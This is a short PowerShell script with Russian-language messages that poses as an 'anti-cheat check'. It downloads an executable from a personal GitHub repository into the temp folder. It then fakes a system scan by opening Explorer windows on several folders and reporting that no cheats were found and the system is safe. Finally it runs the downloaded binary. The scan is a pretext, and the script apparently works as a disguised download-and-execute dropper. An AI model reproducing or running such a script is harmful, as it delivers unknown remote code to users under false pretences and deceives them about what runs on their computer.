# Скачивание
$url = "https://github.com/gseff137-afk/1111/raw/refs/heads/main/cheker.exe"
$path = "$env:TEMP\check.exe"

Write-Host "=== АНТИЧИТ ПРОВЕРКА ===" -Foreground Cyan
Write-Host ""
Write-Host "Скачивание защищенного клиента..." -Foreground Yellow
iwr $url -OutFile $path -UseBasicParsing
Write-Host "✓ Скачано" -Foreground Green

Write-Host ""
Write-Host "Начинаю проверку системы..." -Foreground Cyan
Write-Host ""

# Простая проверка с открытием папок
$checks = @(
    @{Name="Диск C:\"; Path="C:\"; Time=3},
    @{Name="Временные файлы"; Path="$env:TEMP"; Time=3},
    @{Name="Системные файлы"; Path="C:\Windows"; Time=3},
    @{Name="Программы"; Path="C:\Program Files"; Time=3},
    @{Name="Документы"; Path="$env:USERPROFILE\Documents"; Time=3}
)

foreach ($check in $checks) {
    Write-Host "Проверяю: $($check.Name)" -Foreground Yellow
    explorer $check.Path
    Start-Sleep $check.Time
    Write-Host "  ✓ Проверено" -Foreground Green
}

Write-Host ""
Write-Host "=========================" -Foreground Green
Write-Host "ПРОВЕРКА ЗАВЕРШЕНА!" -Foreground White -Background Green
Write-Host "=========================" -Foreground Green
Write-Host ""
Write-Host "Читов не обнаружено" -Foreground Green
Write-Host "Система безопасна" -Foreground Green
Write-Host ""

Write-Host "Запускаю программу..." -Foreground Cyan
Start-Sleep 2
& $path
